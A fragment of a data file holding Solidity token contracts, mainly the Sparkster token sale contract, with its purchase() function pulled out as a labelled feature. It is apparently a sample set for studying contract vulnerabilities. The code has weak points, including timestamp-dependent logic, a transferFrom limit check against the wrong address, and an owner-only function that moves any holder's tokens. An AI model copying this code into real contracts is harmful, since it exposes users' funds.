for (uint i = 1; i < length; i++) {\n divisor = divisor / 256;\n b = (word / divisor) & 0xFF;\n if (b & 0xC0 != 0x80) {\n return 0;\n }\n ret = (ret * 64) | (b & 0x3F);\n }\n return ret;\n }\n function keccak(slice self) internal pure returns (bytes32 ret) {\n assembly {\n ret := keccak256(mload(add(self, 32)), mload(self))\n }\n }\n function startsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n if (self._ptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function beyond(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n bool equal = true;\n if (self._ptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, length), sha3(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n self._ptr += needle._len;\n }\n return self;\n }\n function endsWith(slice self, slice needle) internal pure returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n if (selfptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n return equal;\n }\n function until(slice self, slice needle) internal pure returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n uint selfptr = self._ptr + self._len - needle._len;\n bool equal = true;\n if (selfptr != needle._ptr) {\n assembly {\n let length := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n }\n }\n if (equal) {\n self._len -= needle._len;\n }\n return self;\n }\n event log_bytemask(bytes32 mask);\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr = selfptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n uint end = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr >= end)\n return selfptr + selflen;\n ptr++;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n uint ptr;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n bytes32 needledata;\n assembly { needledata := and(mload(needleptr), mask) }\n ptr = selfptr + selflen - needlelen;\n bytes32 ptrdata;\n assembly { ptrdata := and(mload(ptr), mask) }\n while (ptrdata != needledata) {\n if (ptr <= selfptr)\n return selfptr;\n ptr--;\n assembly { ptrdata := and(mload(ptr), mask) }\n }\n return ptr + needlelen;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr + (selflen - needlelen);\n while (ptr >= selfptr) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr + needlelen;\n ptr -= 1;\n }\n }\n }\n return selfptr;\n }\n function find(slice self, slice needle) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len -= ptr - self._ptr;\n self._ptr = ptr;\n return self;\n }\n function rfind(slice self, slice needle) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len = ptr - self._ptr;\n return self;\n }\n function split(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal pure returns (slice token) {\n split(self, needle, token);\n }\n function rsplit(slice self, slice needle, slice token) internal pure returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = ptr;\n token._len = self._len - (ptr - self._ptr);\n if (ptr == self._ptr) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n }\n return token;\n }\n function rsplit(slice self, slice needle) internal pure returns (slice token) {\n rsplit(self, needle, token);\n }\n function count(slice self, slice needle) internal pure returns (uint cnt) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n cnt++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n function contains(slice self, slice needle) internal pure returns (bool) {\n return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n }\n function concat(slice self, slice other) internal pure returns (string) {\n string memory ret = new string(self._len + other._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n memcpy(retptr + self._len, other._ptr, other._len);\n return ret;\n }\n function join(slice self, slice[] parts) internal pure returns (string) {\n if (parts.length == 0)\n return \"\";\n uint length = self._len * (parts.length - 1);\n for(uint i = 0; i < parts.length; i++)\n length += parts[i]._len;\n string memory ret = new string(length);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n for(i = 0; i < parts.length; i++) {\n memcpy(retptr, parts[i]._ptr, parts[i]._len);\n retptr += parts[i]._len;\n if (i < parts.length - 1) {\n memcpy(retptr, self._ptr, self._len);\n retptr += self._len;\n }\n }\n return ret;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity 0.4.24;\ncontract SparksterToken is StandardToken, Ownable{\n using strings for *;\n using SafeMath for uint256;\n struct Member {\n address walletAddress;\n mapping(uint256 => bool) groupMemberships;\n mapping(uint256 => uint256) ethBalance;\n mapping(uint256 => uint256) tokenBalance;\n uint256 max1;\n int256 transferred;\n bool exists;\n }\n struct Group {\n bool distributed;\n bool distributing;\n bool unlocked;\n uint256 groupNumber;\n uint256 ratio;\n uint256 startTime;\n uint256 phase1endTime;\n uint256 phase2endTime;\n uint256 deadline;\n uint256 max2;\n uint256 max3;\n uint256 ethTotal;\n uint256 cap;\n uint256 howManyDistributed;\n }\n bool public transferLock = true;\n bool public allowedToSell = false;\n bool public allowedToPurchase = false;\n string public name;\n string public symbol;\n uint8 public decimals;\n uint256 public maxGasPrice;\n uint256 internal nextGroupNumber;\n uint256 public sellPrice;\n address[] internal allMembers;\n address[] internal allNonMembers;\n mapping(address => bool) internal nonMemberTransfers;\n mapping(address => Member) internal members;\n mapping(uint256 => Group) internal groups;\n mapping(uint256 => address[]) internal associations;\n uint256 public openGroupNumber;\n event PurchaseSuccess(address indexed _addr, uint256 _groupNumber, uint256 _weiAmount,uint256 _totalEthBalance,uint256 _totalTokenBalance);\n event NearingHardCap(uint256 groupNumber, uint256 remainder);\n event ReachedHardCap(uint256 groupNumber);\n event DistributeDone(uint256 groupNumber);\n event UnlockDone(uint256 groupNumber);\n event GroupCreated(uint256 groupNumber, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio);\n event ChangedAllowedToSell(bool allowedToSell);\n event ChangedAllowedToPurchase(bool allowedToPurchase);\n event ChangedTransferLock(bool transferLock);\n event SetSellPrice(uint256 sellPrice);\n event Added(address walletAddress, uint256 group, uint256 tokens, uint256 maxContribution1);\n event SplitTokens(uint256 splitFactor);\n event ReverseSplitTokens(uint256 splitFactor);\n modifier onlyPayloadSize(uint size) {\n require(msg.data.length == size + 4);\n _;\n }\n modifier canTransfer() {\n require(!transferLock);\n _;\n }\n modifier canPurchase() {\n require(allowedToPurchase);\n _;\n }\n modifier canSell() {\n require(allowedToSell);\n _;\n }\n function() public payable {\n purchase();\n }\n constructor() public {\n name = \"Sparkster\";\n decimals = 18;\n symbol = \"SPRK\";\n setMaximumGasPrice(40);\n mintTokens(435000000);\n }\n function setMaximumGasPrice(uint256 gweiPrice) public onlyOwner returns(bool success) {\n maxGasPrice = gweiPrice.mul(10**9);\n return true;\n }\n function parseAddr(string _a) pure internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function parseInt(string _a, uint _b) pure internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decim = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decim) {\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decim = true;\n }\n return mint;\n }\n function mintTokens(uint256 amount) public onlyOwner {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n totalSupply_ = totalSupply_.add(decimalAmount);\n balances[msg.sender] = balances[msg.sender].add(decimalAmount);\n emit Transfer(address(0), msg.sender, decimalAmount);\n }\n function purchase() public canPurchase payable{\n require(msg.sender != address(0));\n Member storage memberRecord = members[msg.sender];\n Group storage openGroup = groups[openGroupNumber];\n require(openGroup.ratio > 0);\n require(memberRecord.exists && memberRecord.groupMemberships[openGroup.groupNumber] && !openGroup.distributing && !openGroup.distributed && !openGroup.unlocked);\n uint256 currentTimestamp = block.timestamp;\n require(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\n require(tx.gasprice <= maxGasPrice);\n uint256 weiAmount = msg.value;\n require(weiAmount >= 0.1 ether);\n uint256 ethTotal = openGroup.ethTotal.add(weiAmount);\n require(ethTotal <= openGroup.cap);\n uint256 userETHTotal = memberRecord.ethBalance[openGroup.groupNumber].add(weiAmount);\n if(currentTimestamp <= openGroup.phase1endTime){\n require(userETHTotal <= memberRecord.max1);\n } else if (currentTimestamp <= openGroup.phase2endTime) {\n require(userETHTotal <= openGroup.max2);\n } else {\n require(userETHTotal <= openGroup.max3);\n }\n uint256 tokenAmount = weiAmount.mul(openGroup.ratio);\n uint256 newLeftOver = balances[owner].sub(tokenAmount);\n openGroup.ethTotal = ethTotal;\n memberRecord.ethBalance[openGroup.groupNumber] = userETHTotal;\n memberRecord.tokenBalance[openGroup.groupNumber] = memberRecord.tokenBalance[openGroup.groupNumber].add(tokenAmount);\n balances[owner] = newLeftOver;\n owner.transfer(weiAmount);\n emit PurchaseSuccess(msg.sender,openGroupNumber,weiAmount,memberRecord.ethBalance[openGroup.groupNumber],memberRecord.tokenBalance[openGroup.groupNumber]);\n if (getHowMuchUntilHardCap() <= 100 ether) {\n emit NearingHardCap(openGroupNumber, getHowMuchUntilHardCap());\n }\n if (openGroup.ethTotal == openGroup.cap) {\n emit ReachedHardCap(openGroupNumber);\n }\n }\n function sell(uint256 amount) public canSell {\n uint256 decimalAmount = amount.mul(uint(10)**decimals);\n if (members[msg.sender].exists) {\n int256 sellValue = members[msg.sender].transferred + int(decimalAmount);\n require(sellValue >= members[msg.sender].transferred);\n require(sellValue <= int(getUnlockedBalanceLimit(msg.sender)));\n members[msg.sender].transferred = sellValue;\n }\n balances[msg.sender] = balances[msg.sender].sub(decimalAmount);\n uint256 totalCost = amount.mul(sellPrice);\n require(address(this).balance >= totalCost);\n balances[owner] = balances[owner].add(decimalAmount);\n msg.sender.transfer(totalCost);\n emit Transfer(msg.sender, owner, decimalAmount);\n }\n function fundContract() public onlyOwner payable {\n }\n function setSellPrice(uint256 thePrice) public onlyOwner {\n sellPrice = thePrice;\n emit SetSellPrice(sellPrice);\n }\n function setAllowedToSell(bool value) public onlyOwner {\n allowedToSell = value;\n emit ChangedAllowedToSell(allowedToSell);\n }\n function setAllowedToPurchase(bool value) public onlyOwner {\n allowedToPurchase = value;\n emit ChangedAllowedToPurchase(allowedToPurchase);\n }\n function createGroup(uint256 startEpoch, uint256 phase1endEpoch, uint256 phase2endEpoch, uint256 deadlineEpoch, uint256 phase2cap, uint256 phase3cap, uint256 etherCap, uint256 ratio) public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n Group storage theGroup = groups[nextGroupNumber];\n theGroup.groupNumber = nextGroupNumber;\n theGroup.startTime = startEpoch;\n theGroup.phase1endTime = phase1endEpoch;\n theGroup.phase2endTime = phase2endEpoch;\n theGroup.deadline = deadlineEpoch;\n theGroup.max2 = phase2cap;\n theGroup.max3 = phase3cap;\n theGroup.cap = etherCap;\n theGroup.ratio = ratio;\n createdGroupNumber = nextGroupNumber;\n nextGroupNumber++;\n success = true;\n emit GroupCreated(createdGroupNumber, startEpoch, phase1endEpoch, phase2endEpoch, deadlineEpoch, phase2cap, phase3cap, etherCap, ratio);\n }\n function createGroup() public onlyOwner returns (bool success, uint256 createdGroupNumber) {\n return createGroup(0, 0, 0, 0, 0, 0, 0, 0);\n }\n function getGroup(uint256 groupNumber) public view returns(bool distributed, bool unlocked, uint256 phase2cap, uint256 phase3cap, uint256 cap, uint256 ratio, uint256 startTime, uint256 phase1endTime, uint256 phase2endTime, uint256 deadline, uint256 weiTotal, uint256 howManyDistributed) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n distributed = theGroup.distributed;\n unlocked = theGroup.unlocked;\n phase2cap = theGroup.max2;\n phase3cap = theGroup.max3;\n cap = theGroup.cap;\n ratio = theGroup.ratio;\n startTime = theGroup.startTime;\n phase1endTime = theGroup.phase1endTime;\n phase2endTime = theGroup.phase2endTime;\n deadline = theGroup.deadline;\n weiTotal = theGroup.ethTotal;\n howManyDistributed = theGroup.howManyDistributed;\n }\n function getHowMuchUntilHardCap() public view returns(uint256 remainder) {\n return groups[openGroupNumber].cap - groups[openGroupNumber].ethTotal;\n }\n function getHowManyLeftToDistribute(uint256 groupNumber) public view returns(uint256 howManyLeftToDistribute) {\n require(groupNumber < nextGroupNumber);\n Group storage theGroup = groups[groupNumber];\n howManyLeftToDistribute = associations[groupNumber].length - theGroup.howManyDistributed;\n }\n function getMembersInGroup(uint256 groupNumber) public view returns (address[]) {\n require(groupNumber < nextGroupNumber);\n return associations[groupNumber];\n }\n function addMember(address walletAddress, uint256 groupNumber, uint256 tokens, uint256 maxContribution1) public onlyOwner returns (bool success) {\n Member storage theMember = members[walletAddress];\n Group storage theGroup = groups[groupNumber];\n require(groupNumber < nextGroupNumber);\n require(!theGroup.distributed && !theGroup.distributing && !theGroup.unlocked);\n require(!theMember.exists);\n theMember.walletAddress = walletAddress;\n theMember.groupMemberships[groupNumber] = true;\n balances[owner] = balances[owner].sub(tokens);\n theMember.tokenBalance[groupNumber] = tokens;\n theMember.max1 = maxContribution1;\n if (balances[walletAddress] > 0) {\n theMember.transferred = -int(balances[walletAddress]);\n }\n theMember.exists = true;\n associations[groupNumber].push(walletAddress);\n allMembers.push(walletAddress);\n emit Added(walletAddress, groupNumber, tokens, maxContribution1);\n return true;\n }\n function addMemberToGroup(address walletAddress, uint256 groupNumber) public onlyOwner returns(bool success) {\n Member storage memberRecord = members[walletAddress];\n require(memberRecord.exists && groupNumber < nextGroupNumber && !memberRecord.groupMemberships[groupNumber]);\n memberRecord.groupMemberships[groupNumber] = true;\n associations[groupNumber].push(walletAddress);\n return true;\n }\n function upload(string uploadedData) public onlyOwner returns (bool success) {\n strings.slice memory uploadedSlice = uploadedData.toSlice();\n strings.slice memory nextRecord = \"\".toSlice();\n strings.slice memory nextDatum = \"\".toSlice();\n strings.slice memory recordSeparator = \"|\".toSlice();\n strings.slice memory datumSeparator = \":\".toSlice();\n while (!uploadedSlice.empty()) {\n nextRecord = uploadedSlice.split(recordSeparator);\n nextDatum = nextRecord.split(datumSeparator);\n address memberAddress = parseAddr(nextDatum.toString());\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberGroup = parseInt(nextDatum.toString(), 0);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberTokens = parseInt(nextDatum.toString(), 0);\n nextDatum = nextRecord.split(datumSeparator);\n uint256 memberMaxContribution1 = parseInt(nextDatum.toString(), 0);\n addMember(memberAddress, memberGroup, memberTokens, memberMaxContribution1);\n }\n return true;\n }\n function distribute(uint256 groupNumber, uint256 howMany) public onlyOwner returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n require(groupNumber < nextGroupNumber && !theGroup.distributed );\n uint256 inclusiveStartIndex = theGroup.howManyDistributed;\n uint256 exclusiveEndIndex = inclusiveStartIndex.add(howMany);\n theGroup.distributing = true;\n uint256 n = associations[groupNumber].length;\n require(n > 0 );\n if (exclusiveEndIndex > n) {\n exclusiveEndIndex = n;\n }\n for (uint256 i = inclusiveStartIndex; i < exclusiveEndIndex; i++) {\n address memberAddress = associations[groupNumber][i];\n Member storage currentMember = members[memberAddress];\n uint256 balance = currentMember.tokenBalance[groupNumber];\n if (balance > 0) {\n balances[memberAddress] = balances[memberAddress].add(balance);\n emit Transfer(owner, memberAddress, balance);\n }\n theGroup.howManyDistributed++;\n }\n if (theGroup.howManyDistributed == n) {\n theGroup.distributed = true;\n theGroup.distributing = false;\n emit DistributeDone(groupNumber);\n }\n return true;\n }\n function getUnlockedBalanceLimit(address walletAddress) internal view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n for (uint256 i = 0; i < nextGroupNumber; i++) {\n if (groups[i].unlocked) {\n balance = balance.add(theMember.tokenBalance[i]);\n }\n }\n return balance;\n }\n function getUnlockedTokens(address walletAddress) public view returns(uint256 balance) {\n Member storage theMember = members[walletAddress];\n if (!theMember.exists) {\n return balances[walletAddress];\n }\n return uint256(int(getUnlockedBalanceLimit(walletAddress)) - theMember.transferred);\n }\n function unlock(uint256 groupNumber) public onlyOwner returns (bool success) {\n Group storage theGroup = groups[groupNumber];\n require(theGroup.distributed && !theGroup.unlocked);\n theGroup.unlocked = true;\n emit UnlockDone(groupNumber);\n return true;\n }\n function setTransferLock(bool value) public onlyOwner {\n transferLock = value;\n emit ChangedTransferLock(transferLock);\n }\n function burn(uint256 amount) public onlyOwner {\n balances[msg.sender] = balances[msg.sender].sub(amount);\n totalSupply_ = totalSupply_.sub(amount);\n emit Transfer(msg.sender, address(0), amount);\n }\n function splitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 increaseSupplyBy = ownerBalance.mul(splitFactor).sub(ownerBalance);\n balances[msg.sender] = balances[msg.sender].mul(splitFactor);\n totalSupply_ = totalSupply_.mul(splitFactor);\n emit Transfer(address(0), msg.sender, increaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred * int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 multiplier = memberBalance.mul(splitFactor);\n currentMember.tokenBalance[j] = multiplier;\n }\n }\n n = nextGroupNumber;\n require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.mul(splitFactor);\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 decreaseSupplyBy = ownerBalance.sub(ownerBalance.div(splitFactor));\n totalSupply_ = totalSupply_.div(splitFactor);\n balances[msg.sender] = ownerBalance.div(splitFactor);\n emit Transfer(msg.sender, address(0), decreaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred / int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 divier = memberBalance.div(splitFactor);\n currentMember.tokenBalance[j] = divier;\n }\n }\n n = nextGroupNumber;\n require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.div(splitFactor);\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function splitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n splitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 multiplier1 = memberBalance.mul(splitFactor);\n uint256 increaseMemberSupplyBy = multiplier1.sub(memberBalance);\n balances[currentMember] = multiplier1;\n emit Transfer(address(0), currentMember, increaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 multiplier2 = nonMemberBalance.mul(splitFactor);\n uint256 increaseNonMemberSupplyBy = multiplier2.sub(nonMemberBalance);\n balances[currentNonMember] = multiplier2;\n emit Transfer(address(0), currentNonMember, increaseNonMemberSupplyBy);\n }\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n reverseSplitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 divier1 = memberBalance.div(splitFactor);\n uint256 decreaseMemberSupplyBy = memberBalance.sub(divier1);\n balances[currentMember] = divier1;\n emit Transfer(currentMember, address(0), decreaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 divier2 = nonMemberBalance.div(splitFactor);\n uint256 decreaseNonMemberSupplyBy = nonMemberBalance.sub(divier2);\n balances[currentNonMember] = divier2;\n emit Transfer(currentNonMember, address(0), decreaseNonMemberSupplyBy);\n }\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function changeMaxContribution(address memberAddress, uint256 newMax1) public onlyOwner {\n Member storage theMember = members[memberAddress];\n require(theMember.exists);\n theMember.max1 = newMax1;\n }\n function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[msg.sender];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && msg.sender != owner) {\n bool fromTransferee = nonMemberTransfers[msg.sender];\n if (!fromTransferee) {\n nonMemberTransfers[msg.sender] = true;\n allNonMembers.push(msg.sender);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && _from != owner) {\n bool fromTransferee = nonMemberTransfers[_from];\n if (!fromTransferee) {\n nonMemberTransfers[_from] = true;\n allNonMembers.push(_from);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transferFrom(_from, _to, _value);\n }\n function setOpenGroup(uint256 groupNumber) public onlyOwner returns (bool success) {\n require(groupNumber < nextGroupNumber);\n openGroupNumber = groupNumber;\n return true;\n }\n function getUndistributedBalanceOf(address walletAddress, uint256 groupNumber) public view returns (uint256 balance) {\n Member storage theMember = members[walletAddress];\n require(theMember.exists);\n if (groups[groupNumber].distributed)\n return 0;\n return theMember.tokenBalance[groupNumber];\n }\n function checkMyUndistributedBalance(uint256 groupNumber) public view returns (uint256 balance) {\n return getUndistributedBalanceOf(msg.sender, groupNumber);\n }\n function transferRecovery(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) {\n allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 oldTransferred = fromMember.transferred;\n fromMember.transferred -= int(_value);\n require(oldTransferred >= fromMember.transferred);\n }\n return transferFrom(_from, _to, _value);\n }\n}",
  "extract_feature": [
    "function purchase() public canPurchase payable{\nrequire(msg.sender != address(0));\nMember storage memberRecord = members[msg.sender];\nGroup storage openGroup = groups[openGroupNumber];\nrequire(openGroup.ratio > 0);\nrequire(memberRecord.exists && memberRecord.groupMemberships[openGroup.groupNumber] && !openGroup.distributing && !openGroup.distributed && !openGroup.unlocked);\nuint256 currentTimestamp = block.timestamp;\nrequire(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\nrequire(tx.gasprice <= maxGasPrice);\nuint256 weiAmount = msg.value;\nrequire(weiAmount >= 0.1 ether);\nuint256 ethTotal = openGroup.ethTotal.add(weiAmount);\nrequire(ethTotal <= openGroup.cap);\nuint256 userETHTotal = memberRecord.ethBalance[openGroup.groupNumber].add(weiAmount);\nif(currentTimestamp <= openGroup.phase1endTime){\nrequire(userETHTotal <= memberRecord.max1);\n} else if (currentTimestamp <= openGroup.phase2endTime) {\nrequire(userETHTotal <= openGroup.max2);\n} else {\nrequire(userETHTotal <= openGroup.max3);\n}\nuint256 tokenAmount = weiAmount.mul(openGroup.ratio);\nuint256 newLeftOver = balances[owner].sub(tokenAmount);\nopenGroup.ethTotal = ethTotal;\nmemberRecord.ethBalance[openGroup.groupNumber] = userETHTotal;\nmemberRecord.tokenBalance[openGroup.groupNumber] = memberRecord.tokenBalance[openGroup.groupNumber].add(tokenAmount);\nbalances[owner] = newLeftOver;\nowner.transfer(weiAmount);\nemit PurchaseSuccess(msg.sender,openGroupNumber,weiAmount,memberRecord.ethBalance[openGroup.groupNumber],memberRecord.tokenBalance[openGroup.groupNumber]);\nif (getHowMuchUntilHardCap() <= 100 ether) {\nemit NearingHardCap(openGroupNumber, getHowMuchUntilHardCap());\n}\nif (openGroup.ethTotal == openGroup.cap) {\nemit ReachedHardCap(openGroupNumber);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f16"
  },
  "filename": "649.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function 